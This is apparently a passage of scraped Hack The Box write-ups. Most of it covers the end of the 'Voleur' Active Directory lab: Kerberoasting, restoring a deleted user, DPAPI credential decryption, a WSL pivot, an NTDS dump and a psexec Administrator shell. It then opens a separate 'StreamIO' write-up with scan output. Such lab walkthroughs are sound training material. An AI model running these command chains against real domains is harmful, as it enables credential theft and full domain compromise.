└─$ addspn -u 'voleur.htb\svc_ldap' -p 'M1XyC9pW7qT5Vn' -s 'pwn/pwn' -t 'SVC_WINRM' -T 'samname' -k DC.voleur.htb [-] Connecting to host... [-] Binding to host [+] Bind OK [+] Found modification target [+] SPN Modified successfully └─$ addspn -u 'voleur.htb\svc_ldap' -p 'M1XyC9pW7qT5Vn' -s 'qwn/qwn' -t 'LACEY.MILLER' -T 'samname' -k DC.voleur.htb [-] Connecting to host... [-] Binding to host [+] Bind OK [+] Found modification target [+] SPN Modified successfully Now to get the TGS hashes for cracking:
└─$ impacket-GetUserSPNs voleur.htb/ryan.naylor:HollowOct31Nyt -k -dc-host DC.voleur.htb -request -outputfile TGS-Hashes.txt The hashes are extracted and stored in a file. To crack them using hashcat, mode 13100 is used:
└─$ hashcat -m 13100 TGS-Hashes.txt /usr/share/wordlists/rockyou.txt Only svc_winrm ’s password is cracked by the tool using the rockyou.txt wordlist. As we don’t need to have the SPNs kept set for the accounts, we can remove them as a standard good practice in AD Pentesting:
└─$ addspn -u 'voleur.htb\svc_ldap' -p 'M1XyC9pW7qT5Vn' -t 'LACEY.MILLER' -T 'samname' -k DC.voleur.htb --clear [-] Connecting to host... [-] Binding to host [+] Bind OK [+] Found modification target [+] Printing object before clearing DN: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb - STATUS: Read - READ TIME: 2026-07-02T02:23:47.730193 sAMAccountName: lacey.miller servicePrincipalName: qwn/qwn [+] SPN Modified successfully └─$ addspn -u 'voleur.htb\svc_ldap' -p 'M1XyC9pW7qT5Vn' -t 'SVC_WINRM' -T 'samname' -k DC.voleur.htb --clear [-] Connecting to host... [-] Binding to host [+] Bind OK [+] Found modification target [+] Printing object before clearing DN: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb - STATUS: Read - READ TIME: 2026-07-02T02:24:47.354575 sAMAccountName: svc_winrm servicePrincipalName: pwn/pwn [+] SPN Modified successfully Login as svc_winrm # The service account svc_winrm is present in the Remote Management Users group which allows us to access the host via WinRM. To get the Kerberos ticket:
└─$ impacket-getTGT voleur.htb/svc_winrm:<PASSWORD> -dc-ip 10.129.232.130 We need to set the following configuration below the [realm] heading in /etc/krb5.conf before using Kerberos ticket with evil-winrm:
VOLEUR.HTB = { kdc = DC.voleur.htb admin_server = DC.voleur.htb } Now we can use evil-winrm to log in:
└─$ evil-winrm -i DC.voleur.htb -r voleur.htb -K svc_winrm.ccache The user.txt is present on the desktop of svc_winrm
Escalating Privileges # Restoring the Deleted User # The svc_ldap service account is a member of the Restore_Users group so it may become possible for us to restore the deleted account of todd.wolfe user. We can check the write permissions for svc_ldap via Bloodyad as privileges over deleted objects are not shown in BloodHound GUI.
└─$ bloodyad -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' -i '10.129.232.130' -H 'DC.voleur.htb' -k get writable <SNIP> distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb permission: CREATE_CHILD; WRITE <SNIP> We have WRITE permissions on it so it is possible for us to recover the deleted account. We need the SID of the user which we want to restore and we can find it by:
└─$ bloodyad -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' -i '10.129.232.130' -H 'DC.voleur.htb' -k get search -c 1.2.840.113556.1.4.2064 --base 'CN=Deleted Objects,DC=voleur,DC=htb' --filter '(&(objectClass=user)(sAMAccountName=Todd.Wolfe))' --attr distinguishedName,sAMAccountName,objectSid,objectClass distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb objectClass: top; person; organizationalPerson; user objectSid: S-1-5-21-3927696377-1337352550-2781715495-1110 sAMAccountName: todd.wolfe To recover the account of todd.wolfe:
└─$ bloodyad -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' -i '10.129.232.130' -H 'DC.voleur.htb' -k set restore S-1-5-21-3927696377-1337352550-2781715495-1110 [+] S-1-5-21-3927696377-1337352550-2781715495-1110 has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb NOTE: After some time, the todd.wolfe account is automatically deleted so restore the deleted account again to move further.
Recovering DPAPI-Protected Credentials # We can now authenticate as todd.wolfe and enumerate the SMB shares again:
└─$ impacket-getTGT voleur.htb/todd.wolfe:NightT1meP1dg3on14 -dc-ip 10.129.232.130 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in Administrator.ccache Accessing shares with impacket-smbclient:
└─$ impacket-smbclient voleur.htb/todd.wolfe@DC.voleur.htb -k -no-pass Enumerating the share, we found that in the “Second-Line Support” folder, the archived home directory of todd.wolfe is available and the usual Desktop, Documents, Downloads etc folders don’t contain anything. In the AppData\Roaming\Microsoft\Protect, the user’s DPAPI master key is present and in AppData\Roaming\Microsoft\Credentials, a DPAPI-encrypted credential blob is also present. We can download both the files and use impacket-dpapi tool to decrypt the master key and then decrypt the protected credential:
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14 <SNIP> Decrypted key with User Key (MD4 protected) Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd535<SNIP> Decrypting the secret:
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key '<Decrypted key>' <SNIP> Username : jeremy.combs Unknown : <REDACTED> Domain Compromise # We get the credentials of jeremy.combs in the decrypted data. Continuing the enumeration of the SMB share via the newly acquired credentials, we found an id_rsa private key with a Note.txt.txt file in the “Third-Line Support” folder. The note contains:
Jeremy, I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux. Please see what you can set up. Thanks, Admin The share folder also contains a Backup directory which denied access.
After copying the private key to our system, we can check if the file contains the key comment via:
└─$ ssh-keygen -y -f id_rsa ssh-rsa  svc_backup@DC On port 2222, SSH server is available because WSL installed on the system and we can connect to it using the key and username we identified:
└─$ ssh -i id_rsa svc_backup@10.129.232.130 -p 2222 On the system, we can escalate to root simply by typing “sudo su”. As the Windows system is running the WSL, the first step is to check if anything from the host system is mounted. In the /mnt, the C drive from the host system is mounted. We can now check if we can access the “Backup” folder we were denied access before.
root@DC:/mnt/c/it/Third-Line Support/Backups# ls -lR ./ ./: total 0 drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025 'Active Directory' drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025 registry './Active Directory': total 24592 -rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30 2025 ntds.dit -rwxrwxrwx 1 svc_backup svc_backup 16384 Jan 30 2025 ntds.jfm ./registry: total 17952 -rwxrwxrwx 1 svc_backup svc_backup 32768 Jan 30 2025 SECURITY -rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30 2025 SYSTEM These files contain the Active Directory database and registry hives required to extract domain credential material. We can download them by starting a Python HTTP server in the WSL Linux and using curl from our system. To parse the hives:
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL In the output, the NTLM password hashes of the domain users are extracted. We can use the Administrator’s hash with impacket-psexec to access the system:
└─$ impacket-psexec voleur.htb/Administrator@DC.voleur.htb -k -no-pass
summary: Kerberos-only AD compromise featuring Kerberoasting, deleted object recovery, DPAPI decryption, SSH pivoting, and NTDS extraction.
title: Voleur Machine Writeup | HTB

content:
Summary # StreamIO is a medium-difficulty Windows machine that begins with subdomain enumeration, leading to a SQL injection vulnerability that exposes user password hashes. After cracking the hashes, valid credentials provide access to the application’s administration panel, where parameter fuzzing and PHP filter abuse reveal the application’s source code. Analysis of the source uncovers a remote file inclusion vulnerability that is leveraged to achieve remote code execution. Following initial access, an internal MSSQL database is enumerated through a Ligolo tunnel to recover additional credentials used for lateral movement. Further local enumeration with WinPEAS reveals saved Firefox credentials, enabling access to another domain account. Finally, BloodHound identifies a privilege escalation path involving the Core Staff group and LAPS permissions, allowing retrieval of the local Administrator password and full system compromise.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total of 65535 possible ports.
└─$ rustscan -a 10.129.8.159 -r 0-65535 PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 443/tcp open https syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 49677/tcp open unknown syn-ack ttl 127 49678/tcp open unknown syn-ack ttl 127 49704/tcp open unknown syn-ack ttl 127 49732/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.8.159 -T4 -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49668,49677,49678,49704,49732 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-29 19:08 +0500 Nmap scan report for 10.129.8.159 Host is up (0.10s latency).
